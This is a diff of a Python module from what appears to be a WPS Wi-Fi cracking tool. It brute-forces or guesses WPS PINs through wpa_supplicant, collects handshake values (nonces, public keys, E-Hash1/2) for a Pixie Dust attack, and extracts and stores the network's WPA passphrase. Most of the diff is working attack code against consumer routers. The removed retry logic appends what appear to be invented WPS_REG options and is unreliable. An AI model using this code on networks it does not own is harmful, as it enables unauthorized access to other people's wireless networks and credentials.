@@ -6,74 +6,51 @@ import time
 import shutil
 import sys
 import codecs
+from typing import Optional
 
 import src.wps.pixiewps
 import src.wps.generator
 import src.utils
 import src.wifi.collector
-import src.wifi.scanner
+from .wpa3 import WPA3Handler
 
 class ConnectionStatus:
     """Stores WPS connection details and status."""
 
     def __init__(self):
-        self.STATUS = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
+        self.STATUS = None
         self.LAST_M_MESSAGE = 0
-        self.ESSID = ''
-        self.BSSID = ''
-        self.WPA_PSK = ''
-        self.RETRY_COUNT = 0
-        self.MAX_RETRIES = 3
-        self.TIMEOUT = 30  # Default timeout in seconds
-        self.SIGNAL_THRESHOLD = -70  # Minimum signal strength for reliable connection
-        self.AUTH_METHOD = 'standard'  # Authentication method
-        self.USE_EXTENDED_AUTH = False  # Whether to use extended authentication
-        self.DELAY_BETWEEN_RETRIES = 2  # Delay between retries in seconds
-        self.AGGRESSIVE_MODE = False  # Whether to use aggressive mode
-        self.LEGACY_SUPPORT = False  # Whether to use legacy support mode
+        self.ESSID = None
+        self.BSSID = None
+        self.WPA_PSK = None
 
     def isFirstHalfValid(self) -> bool:
         """Checks if the first half of the PIN is valid."""
         return self.LAST_M_MESSAGE > 5
 
-    def shouldRetry(self) -> bool:
-        """Determines if another connection attempt should be made."""
-        return self.RETRY_COUNT < self.MAX_RETRIES
-
-    def updateFromNetwork(self, network: dict):
-        """Update connection parameters based on network information."""
-        if 'WPS_Timeout' in network:
-            self.TIMEOUT = network['WPS_Timeout']
-        if 'WPS_Retries' in network:
-            self.MAX_RETRIES = network['WPS_Retries']
-        if 'Auth_Method' in network:
-            self.AUTH_METHOD = network['Auth_Method']
-        if 'Delay_Between_Retries' in network:
-            self.DELAY_BETWEEN_RETRIES = network['Delay_Between_Retries']
-        if 'Use_Extended_Auth' in network:
-            self.USE_EXTENDED_AUTH = network['Use_Extended_Auth']
-        if 'Aggressive_Mode' in network:
-            self.AGGRESSIVE_MODE = network['Aggressive_Mode']
-        if 'Legacy_Support' in network:
-            self.LEGACY_SUPPORT = network['Legacy_Support']
-
     def clear(self):
         """Resets the connection status variables."""
-        self.__init__()
+        self.STATUS = None
+        self.LAST_M_MESSAGE = 0
+        self.ESSID = None
+        self.BSSID = None
+        self.WPA_PSK = None
 
 class Initialize:
-    """WPS connection with enhanced reliability"""
+    """WPS connection"""
 
     def __init__(self, interface: str, write_result: bool = False, save_result: bool = False, print_debug: bool = False):
-        self.INTERFACE = interface
+        self.INTERFACE    = interface
         self.WRITE_RESULT = write_result
-        self.SAVE_RESULT = save_result
-        self.PRINT_DEBUG = print_debug
+        self.SAVE_RESULT  = save_result
+        self.PRINT_DEBUG  = print_debug
+
         self.CONNECTION_STATUS = ConnectionStatus()
-        self.PIXIE_CREDS = src.wps.pixiewps.Data()
+        self.PIXIE_CREDS  = src.wps.pixiewps.Data()
+        self.WPA3_HANDLER = WPA3Handler(interface)
+
         self.TEMPDIR = tempfile.mkdtemp()
-        self.RETRY_DELAY = 5  # Delay between retries in seconds
-        
+
         with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
             temp.write(f'ctrl_interface={self.TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n')
             self.TEMPCONF = temp.name
@@ -84,7 +61,6 @@ class Initialize:
         self.RES_SOCKET_FILE = f'{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}'
         self.RETSOCK = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
         self.RETSOCK.bind(self.RES_SOCKET_FILE)
-        self.RETSOCK.settimeout(self.CONNECTION_STATUS.TIMEOUT)
 
     @staticmethod
     def _getHex(line: str) -> str:
@@ -112,23 +88,46 @@ class Initialize:
         print(f'[+] AP SSID: \'{essid}\'')
 
     def singleConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False, showpixiecmd: bool = False,
-                         pixieforce: bool = False, pbc_mode: bool = False, store_pin_on_fail: bool = False) -> bool:
-        """Enhanced WPS connection with improved router compatibility."""
-        
-        # Get network information from scanner
-        scanner = src.wifi.scanner.WiFiScanner(self.INTERFACE)
-        networks = scanner._iwScanner(skip_output=True)
-        
-        if networks:
-            for network in networks.values():
-                if network['BSSID'] == bssid:
-                    # Update connection parameters based on network info
-                    self.CONNECTION_STATUS.updateFromNetwork(network)
-                    break
-        
+                         pixieforce: bool = False, pbc_mode: bool = False, store_pin_on_fail: bool = False,
+                         wpa3_mode: bool = False, password: str = None) -> bool:
+        """        
+        Establish a WPS connection, using a pin, a calculated pin (if in pixiemode), a PIN
+        generated from a list of likely PINs, PBC mode, or WPA3-SAE. Handles pixiedust
+        attacks if enabled and manages storing PINs on connection failure
+        """
+
+        if wpa3_mode:
+            if not password:
+                print('[!] WPA3 mode requires a password')
+                return False
+                
+            if not bssid or not self.CONNECTION_STATUS.ESSID:
+                print('[!] WPA3 mode requires BSSID and ESSID')
+                return False
+                
+            print(f'[*] Attempting WPA3-SAE connection to {self.CONNECTION_STATUS.ESSID}')
+            success = self.WPA3_HANDLER.connect_wpa3(
+                bssid,
+                self.CONNECTION_STATUS.ESSID,
+                password
+            )
+            
+            if success:
+                status = self.WPA3_HANDLER.get_connection_status(bssid)
+                self.CONNECTION_STATUS.STATUS = 'GOT_PSK'
+                self.CONNECTION_STATUS.WPA_PSK = password
+                self._credentialPrint(
+                    wps_pin='N/A (WPA3)',
+                    wpa_psk=password,
+                    essid=self.CONNECTION_STATUS.ESSID
+                )
+                return True
+                
+            return False
+
         pixiewps_dir = src.utils.PIXIEWPS_DIR
-        generator = src.wps.generator.WPSpin()
-        collector = src.wifi.collector.WiFiCollector()
+        generator    = src.wps.generator.WPSpin()
+        collector    = src.wifi.collector.WiFiCollector()
 
         if not pin:
             if pixiemode:
@@ -144,152 +143,51 @@ class Initialize:
                 except FileNotFoundError:
                     pin = generator.getLikely(bssid) or '12345670'
             elif not pbc_mode:
+                # If not pixiemode, ask user to select a pin from the list
                 pin = generator.promptPin(bssid) or '12345670'
 
-        # Enhanced connection attempt with retries
-        max_attempts = 3
-        for attempt in range(max_attempts):
-            try:
-                if pbc_mode:
-                    self._wpsConnection(bssid, pbc_mode=pbc_mode)
-                    bssid = self.CONNECTION_STATUS.BSSID
-                    pin = '<PBC mode>'
-                elif store_pin_on_fail:
-                    try:
-                        self._wpsConnection(bssid, pin, pixiemode)
-                    except KeyboardInterrupt:
-                        print('\nAborting…')
-                        collector.writePin(bssid, pin)
-                        return False
-                else:
-                    self._wpsConnection(bssid, pin, pixiemode)
-
-                if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
-                    self._credentialPrint(pin, self.CONNECTION_STATUS.WPA_PSK, self.CONNECTION_STATUS.ESSID)
-                    if self.WRITE_RESULT:
-                        collector.writeResult(bssid, self.CONNECTION_STATUS.ESSID, pin, self.CONNECTION_STATUS.WPA_PSK)
-                    if self.SAVE_RESULT:
-                        collector.addNetwork(bssid, self.CONNECTION_STATUS.ESSID, self.CONNECTION_STATUS.WPA_PSK)
-                    if not pbc_mode:
-                        try:
-                            filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''
-                            os.remove(filename)
-                        except FileNotFoundError:
-                            pass
-                    return True
-
-                if pixiemode and attempt == 0:  # Only try Pixie Dust on first attempt
-                    if self.PIXIE_CREDS.getAll():
-                        pin = self.PIXIE_CREDS.runPixieWps(showpixiecmd, pixieforce)
-                        if pin:
-                            return self.singleConnection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
-                        return False
-                    else:
-                        print('[!] Not enough data to run Pixie Dust attack')
-                        return False
-
-                # Adjust parameters for next attempt
-                self._adjustRetryParameters()
-                
-                if attempt < max_attempts - 1:  # Don't print on last attempt
-                    print(f'[*] Connection failed, retrying with adjusted parameters (attempt {attempt + 2}/{max_attempts})')
-                    time.sleep(self.CONNECTION_STATUS.DELAY_BETWEEN_RETRIES)
-
-            except Exception as e:
-                print(f'[!] Error during connection attempt: {str(e)}')
-                if attempt < max_attempts - 1:
-                    print(f'[*] Retrying... (attempt {attempt + 2}/{max_attempts})')
-                    time.sleep(self.CONNECTION_STATUS.DELAY_BETWEEN_RETRIES)
-                continue
-
-        if store_pin_on_fail:
-            collector.writePin(bssid, pin)
-        return False
-
-    def _adjustRetryParameters(self):
-        """Adjust parameters for retry attempts."""
-        # Increase timeout slightly
-        self.CONNECTION_STATUS.TIMEOUT += 5
-        
-        # Adjust delay between retries
-        self.CONNECTION_STATUS.DELAY_BETWEEN_RETRIES += 1
-        
-        # Switch to aggressive mode if not already
-        if not self.CONNECTION_STATUS.AGGRESSIVE_MODE:
-            self.CONNECTION_STATUS.AGGRESSIVE_MODE = True
-        
-        # Enable legacy support if not already
-        if not self.CONNECTION_STATUS.LEGACY_SUPPORT:
-            self.CONNECTION_STATUS.LEGACY_SUPPORT = True
-
-    def _wpsConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False,
-                   pbc_mode: bool = False, verbose: bool = None) -> bool:
-        """Enhanced WPS connection with improved compatibility."""
-        
-        # Reset retry counter for new connection attempt
-        self.CONNECTION_STATUS.RETRY_COUNT = 0
-        
-        while True:
-            try:
-                self.PIXIE_CREDS.clear()
-                self.CONNECTION_STATUS.clear()
-                self.WPAS.stdout.read(300)  # Clean the pipe
-
-                if not verbose:
-                    verbose = self.PRINT_DEBUG
-
-                # Build command with enhanced parameters
-                cmd = self._buildWPSCommand(bssid, pin, pbc_mode)
-
-                r = self._sendAndReceive(cmd)
-
-                if 'OK' not in r:
-                    self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
-                    print(self._explainWpasNotOkStatus(cmd, r))
-                    return False
-
-                while True:
-                    res = self._handleWpas(pixiemode, pbc_mode, verbose)
-
-                    if not res:
-                        break
-                    if self.CONNECTION_STATUS.STATUS == 'WSC_NACK':
-                        break
-                    if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
-                        break
-                    if self.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
-                        break
-
-                self._sendOnly('WPS_CANCEL')
-                return False
-
-            except KeyboardInterrupt:
-                print('\n[!] Interrupted by user')
-                return False
-
-    def _buildWPSCommand(self, bssid: str, pin: str = None, pbc_mode: bool = False) -> str:
-        """Build WPS command with enhanced parameters."""
         if pbc_mode:
-            if bssid:
-                print(f'[*] Starting WPS push button connection to {bssid}…')
-                cmd = f'WPS_PBC {bssid}'
-            else:
-                print('[*] Starting WPS push button connection…')
-                cmd = 'WPS_PBC'
+            self._wpsConnection(bssid, pbc_mode=pbc_mode)
+            bssid = self.CONNECTION_STATUS.BSSID
+            pin = '<PBC mode>'
+        elif store_pin_on_fail:
+            try:
+                self._wpsConnection(bssid, pin, pixiemode)
+            except KeyboardInterrupt:
+                print('\nAborting…')
+                collector.writePin(bssid, pin)
+                return False
         else:
-            cmd = f'WPS_REG {bssid} {pin}'
-            
-            # Add enhanced parameters based on connection status
-            if self.CONNECTION_STATUS.USE_EXTENDED_AUTH:
-                cmd += ' 2'  # Use extended authentication
-            if self.CONNECTION_STATUS.AGGRESSIVE_MODE:
-                cmd += ' aggressive=1'
-            if self.CONNECTION_STATUS.LEGACY_SUPPORT:
-                cmd += ' legacy_support=1'
-            
-            print(f'[*] Trying PIN \'{pin}\' with {self.CONNECTION_STATUS.AUTH_METHOD} method…')
-        
-        return cmd
+            self._wpsConnection(bssid, pin, pixiemode)
+
+        if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
+            self._credentialPrint(pin, self.CONNECTION_STATUS.WPA_PSK, self.CONNECTION_STATUS.ESSID)
+            if self.WRITE_RESULT:
+                collector.writeResult(bssid, self.CONNECTION_STATUS.ESSID, pin, self.CONNECTION_STATUS.WPA_PSK)
+            if self.SAVE_RESULT:
+                collector.addNetwork(bssid, self.CONNECTION_STATUS.ESSID, self.CONNECTION_STATUS.WPA_PSK)
+            if not pbc_mode:
+                # Try to remove temporary PIN file
+                try:
+                    filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''
+                    os.remove(filename)
+                except FileNotFoundError:
+                    pass
+            return True
+        if pixiemode:
+            if self.PIXIE_CREDS.getAll():
+                pin = self.PIXIE_CREDS.runPixieWps(showpixiecmd, pixieforce)
+                if pin:
+                    return self.singleConnection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
+                return False
+            else:
+                print('[!] Not enough data to run Pixie Dust attack')
+                return False
+        else:
+            if store_pin_on_fail:
+                # Saving Pixiewps calculated PIN if can't connect
+                collector.writePin(bssid, pin)
+            return False
 
     def _initWpaSupplicant(self):
         """Initializes wpa_supplicant with the specified configuration"""
@@ -334,134 +232,159 @@ class Initialize:
         self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)
 
     def _handleWpas(self, pixiemode: bool = False, pbc_mode: bool = False, verbose: bool = None) -> bool:
-        """Handles WPA supplicant output with enhanced error handling."""
-        try:
-            line = self.WPAS.stdout.readline()
-            if not verbose:
-                verbose = self.PRINT_DEBUG
-            if not line:
-                self.WPAS.wait()
-                return False
+        """Handles WPA supplicant output and updates connection status."""
 
-            line = line.rstrip('\n')
+        # pylint: disable=invalid-name
+        line = self.WPAS.stdout.readline()
 
-            if verbose:
-                sys.stderr.write(line + '\n')
-
-            if line.startswith('WPS: '):
-                if 'M2D' in line:
-                    print('[-] Received WPS Message M2D')
-                    if self.CONNECTION_STATUS.shouldRetry():
-                        print(f'[*] Retrying in {self.RETRY_DELAY} seconds... (Attempt {self.CONNECTION_STATUS.RETRY_COUNT + 1}/{self.CONNECTION_STATUS.MAX_RETRIES})')
-                        time.sleep(self.RETRY_DELAY)
-                        self.CONNECTION_STATUS.RETRY_COUNT += 1
-                        return True
-                    src.utils.die('[-] Error: AP is not ready after maximum retries')
-                
-                if 'Building Message M' in line:
-                    n = int(line.split('Building Message M')[1])
-                    self.CONNECTION_STATUS.LAST_M_MESSAGE = n
-                    print(f'[*] Sending WPS Message M{n}…')
-                elif 'Received M' in line:
-                    n = int(line.split('Received M')[1])
-                    self.CONNECTION_STATUS.LAST_M_MESSAGE = n
-                    print(f'[*] Received WPS Message M{n}')
-                    if n == 5:
-                        print('[+] The first half of the PIN is valid')
-                elif 'Received WSC_NACK' in line:
-                    self.CONNECTION_STATUS.STATUS = 'WSC_NACK'
-                    print('[-] Received WSC NACK')
-                    if self.CONNECTION_STATUS.shouldRetry():
-                        print(f'[*] Retrying with different timing... (Attempt {self.CONNECTION_STATUS.RETRY_COUNT + 1}/{self.CONNECTION_STATUS.MAX_RETRIES})')
-                        time.sleep(self.RETRY_DELAY)
-                        self.CONNECTION_STATUS.RETRY_COUNT += 1
-                        return True
-                    print('[-] Error: wrong PIN code or router incompatibility')
-                elif 'Enrollee Nonce' in line and 'hexdump' in line:
-                    self.PIXIE_CREDS.E_NONCE = self._getHex(line)
-                    assert len(self.PIXIE_CREDS.E_NONCE) == 16 * 2
-                    if pixiemode:
-                        print(f'[P] E-Nonce: {self.PIXIE_CREDS.E_NONCE}')
-                elif 'DH own Public Key' in line and 'hexdump' in line:
-                    self.PIXIE_CREDS.PKR = self._getHex(line)
-                    assert len(self.PIXIE_CREDS.PKR) == 192 * 2
-                    if pixiemode:
-                        print(f'[P] PKR: {self.PIXIE_CREDS.PKR}')
-                elif 'DH peer Public Key' in line and 'hexdump' in line:
-                    self.PIXIE_CREDS.PKE = self._getHex(line)
-                    assert len(self.PIXIE_CREDS.PKE) == 192 * 2
-                    if pixiemode:
-                        print(f'[P] PKE: {self.PIXIE_CREDS.PKE}')
-                elif 'AuthKey' in line and 'hexdump' in line:
-                    self.PIXIE_CREDS.AUTHKEY = self._getHex(line)
-                    assert len(self.PIXIE_CREDS.AUTHKEY) == 32 * 2
-                    if pixiemode:
-                        print(f'[P] AuthKey: {self.PIXIE_CREDS.AUTHKEY}')
-                elif 'E-Hash1' in line and 'hexdump' in line:
-                    self.PIXIE_CREDS.E_HASH1 = self._getHex(line)
-                    assert len(self.PIXIE_CREDS.E_HASH1) == 32 * 2
-                    if pixiemode:
-                        print(f'[P] E-Hash1: {self.PIXIE_CREDS.E_HASH1}')
-                elif 'E-Hash2' in line and 'hexdump' in line:
-                    self.PIXIE_CREDS.E_HASH2 = self._getHex(line)
-                    assert len(self.PIXIE_CREDS.E_HASH2) == 32 * 2
-                    if pixiemode:
-                        print(f'[P] E-Hash2: {self.PIXIE_CREDS.E_HASH2}')
-                elif 'Network Key' in line and 'hexdump' in line:
-                    self.CONNECTION_STATUS.STATUS = 'GOT_PSK'
-                    self.CONNECTION_STATUS.WPA_PSK = bytes.fromhex(self._getHex(line)).decode('utf-8', errors='replace')
-            elif ': State: ' in line:
-                if '-> SCANNING' in line:
-                    self.CONNECTION_STATUS.STATUS = 'scanning'
-                    print('[*] Scanning…')
-            elif ('WPS-FAIL' in line) and (self.CONNECTION_STATUS.STATUS != ''):
-                self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
-                print('[-] wpa_supplicant returned WPS-FAIL')
-            elif 'Trying to authenticate with' in line:
-                self.CONNECTION_STATUS.STATUS = 'authenticating'
-                if 'SSID' in line:
-                    self.CONNECTION_STATUS.ESSID = codecs.decode('\''.join(line.split('\'')[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
-                print('[*] Authenticating…')
-            elif 'Authentication response' in line:
-                print('[+] Authenticated')
-            elif 'Trying to associate with' in line:
-                self.CONNECTION_STATUS.STATUS = 'associating'
-                if 'SSID' in line:
-                    self.CONNECTION_STATUS.ESSID = codecs.decode('\''.join(line.split('\'')[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
-                print('[*] Associating with AP…')
-            elif ('Associated with' in line) and (self.INTERFACE in line):
-                bssid = line.split()[-1].upper()
-                if self.CONNECTION_STATUS.ESSID:
-                    print(f'[+] Associated with {bssid} (ESSID: {self.CONNECTION_STATUS.ESSID})')
-                else:
-                    print(f'[+] Associated with {bssid}')
-            elif 'EAPOL: txStart' in line:
-                self.CONNECTION_STATUS.STATUS = 'eapol_start'
-                print('[*] Sending EAPOL Start…')
-            elif 'EAP entering state IDENTITY' in line:
-                print('[*] Received Identity Request')
-            elif 'using real identity' in line:
-                print('[*] Sending Identity Response…')
-            elif 'WPS-TIMEOUT' in line:
-                print('[-] Warning: Received WPS-TIMEOUT')
-            elif pbc_mode and ('selected BSS ' in line):
-                bssid = line.split('selected BSS ')[-1].split()[0].upper()
-                self.CONNECTION_STATUS.BSSID = bssid
-                print(f'[*] Selected AP: {bssid}')
-
-        except socket.timeout:
-            print('[-] Connection timed out')
-            if self.CONNECTION_STATUS.shouldRetry():
-                print(f'[*] Retrying connection... (Attempt {self.CONNECTION_STATUS.RETRY_COUNT + 1}/{self.CONNECTION_STATUS.MAX_RETRIES})')
-                time.sleep(self.RETRY_DELAY)
-                self.CONNECTION_STATUS.RETRY_COUNT += 1
-                return True
+        if not verbose:
+            verbose = self.PRINT_DEBUG
+        if not line:
+            self.WPAS.wait()
             return False
-        except Exception as e:
-            print(f'[-] Error during WPS connection: {str(e)}')
-            return False
+
+        line = line.rstrip('\n')
+
+        if verbose:
+            sys.stderr.write(line + '\n')
+
+        if line.startswith('WPS: '):
+            if 'M2D' in line:
+                print('[-] Received WPS Message M2D')
+                src.utils.die('[-] Error: AP is not ready yet, try later')
+            if 'Building Message M' in line:
+                n = int(line.split('Building Message M')[1])
+                self.CONNECTION_STATUS.LAST_M_MESSAGE = n
+                print(f'[*] Sending WPS Message M{n}…')
+            elif 'Received M' in line:
+                n = int(line.split('Received M')[1])
+                self.CONNECTION_STATUS.LAST_M_MESSAGE = n
+                print(f'[*] Received WPS Message M{n}')
+                if n == 5:
+                    print('[+] The first half of the PIN is valid')
+            elif 'Received WSC_NACK' in line:
+                self.CONNECTION_STATUS.STATUS = 'WSC_NACK'
+                print('[-] Received WSC NACK')
+                print('[-] Error: wrong PIN code')
+            elif 'Enrollee Nonce' in line and 'hexdump' in line:
+                self.PIXIE_CREDS.E_NONCE = self._getHex(line)
+                assert len(self.PIXIE_CREDS.E_NONCE) == 16 * 2
+                if pixiemode:
+                    print(f'[P] E-Nonce: {self.PIXIE_CREDS.E_NONCE}')
+            elif 'DH own Public Key' in line and 'hexdump' in line:
+                self.PIXIE_CREDS.PKR = self._getHex(line)
+                assert len(self.PIXIE_CREDS.PKR) == 192 * 2
+                if pixiemode:
+                    print(f'[P] PKR: {self.PIXIE_CREDS.PKR}')
+            elif 'DH peer Public Key' in line and 'hexdump' in line:
+                self.PIXIE_CREDS.PKE = self._getHex(line)
+                assert len(self.PIXIE_CREDS.PKE) == 192 * 2
+                if pixiemode:
+                    print(f'[P] PKE: {self.PIXIE_CREDS.PKE}')
+            elif 'AuthKey' in line and 'hexdump' in line:
+                self.PIXIE_CREDS.AUTHKEY = self._getHex(line)
+                assert len(self.PIXIE_CREDS.AUTHKEY) == 32 * 2
+                if pixiemode:
+                    print(f'[P] AuthKey: {self.PIXIE_CREDS.AUTHKEY}')
+            elif 'E-Hash1' in line and 'hexdump' in line:
+                self.PIXIE_CREDS.E_HASH1 = self._getHex(line)
+                assert len(self.PIXIE_CREDS.E_HASH1) == 32 * 2
+                if pixiemode:
+                    print(f'[P] E-Hash1: {self.PIXIE_CREDS.E_HASH1}')
+            elif 'E-Hash2' in line and 'hexdump' in line:
+                self.PIXIE_CREDS.E_HASH2 = self._getHex(line)
+                assert len(self.PIXIE_CREDS.E_HASH2) == 32 * 2
+                if pixiemode:
+                    print(f'[P] E-Hash2: {self.PIXIE_CREDS.E_HASH2}')
+            elif 'Network Key' in line and 'hexdump' in line:
+                self.CONNECTION_STATUS.STATUS = 'GOT_PSK'
+                self.CONNECTION_STATUS.WPA_PSK = bytes.fromhex(self._getHex(line)).decode('utf-8', errors='replace')
+        elif ': State: ' in line:
+            if '-> SCANNING' in line:
+                self.CONNECTION_STATUS.STATUS = 'scanning'
+                print('[*] Scanning…')
+        elif ('WPS-FAIL' in line) and (self.CONNECTION_STATUS.STATUS != ''):
+            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
+            print('[-] wpa_supplicant returned WPS-FAIL')
+#        elif 'NL80211_CMD_DEL_STATION' in line:
+#            print("[-] Something else is trying to use the interface!")
+        elif 'Trying to authenticate with' in line:
+            self.CONNECTION_STATUS.STATUS = 'authenticating'
+            if 'SSID' in line:
+                self.CONNECTION_STATUS.ESSID = codecs.decode('\''.join(line.split('\'')[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+            print('[*] Authenticating…')
+        elif 'Authentication response' in line:
+            print('[+] Authenticated')
+        elif 'Trying to associate with' in line:
+            self.CONNECTION_STATUS.STATUS = 'associating'
+            if 'SSID' in line:
+                self.CONNECTION_STATUS.ESSID = codecs.decode('\''.join(line.split('\'')[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+            print('[*] Associating with AP…')
+        elif ('Associated with' in line) and (self.INTERFACE in line):
+            bssid = line.split()[-1].upper()
+            if self.CONNECTION_STATUS.ESSID:
+                print(f'[+] Associated with {bssid} (ESSID: {self.CONNECTION_STATUS.ESSID})')
+            else:
+                print(f'[+] Associated with {bssid}')
+        elif 'EAPOL: txStart' in line:
+            self.CONNECTION_STATUS.STATUS = 'eapol_start'
+            print('[*] Sending EAPOL Start…')
+        elif 'EAP entering state IDENTITY' in line:
+            print('[*] Received Identity Request')
+        elif 'using real identity' in line:
+            print('[*] Sending Identity Response…')
+        elif 'WPS-TIMEOUT' in line:
+            print('[-] Warning: Received WPS-TIMEOUT')
+        elif pbc_mode and ('selected BSS ' in line):
+            bssid = line.split('selected BSS ')[-1].split()[0].upper()
+            self.CONNECTION_STATUS.BSSID = bssid
+            print(f'[*] Selected AP: {bssid}')
 
         return True
+
+    def _wpsConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False,
+                       pbc_mode: bool = False, verbose: bool = None) -> bool:
+        """Handles WPS connection process"""
+
+        self.PIXIE_CREDS.clear()
+        self.CONNECTION_STATUS.clear()
+        self.WPAS.stdout.read(300) # Clean the pipe
+
+        if not verbose:
+            verbose = self.PRINT_DEBUG
+
+        if pbc_mode:
+            if bssid:
+                print(f'[*] Starting WPS push button connection to {bssid}…')
+                cmd = f'WPS_PBC {bssid}'
+            else:
+                print('[*] Starting WPS push button connection…')
+                cmd = 'WPS_PBC'
+        else:
+            print(f'[*] Trying PIN \'{pin}\'…')
+            cmd = f'WPS_REG {bssid} {pin}'
+
+        r = self._sendAndReceive(cmd)
+
+        if 'OK' not in r:
+            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
+            print(self._explainWpasNotOkStatus(cmd, r))
+            return False
+
+        while True:
+            res = self._handleWpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
+
+            if not res:
+                break
+            if self.CONNECTION_STATUS.STATUS == 'WSC_NACK':
+                break
+            if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
+                break
+            if self.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
+                break
+
+        self._sendOnly('WPS_CANCEL')
+        return False
 
     def _cleanup(self):
         """Terminates connections and removes temporary files"""
@@ -473,4 +396,7 @@ class Initialize:
         os.remove(self.TEMPCONF)
 
     def __del__(self):
-        self._cleanup()
+        try:
+            self._cleanup()
+        except Exception as e:
+            print(f'Error cleaning up: {e}')
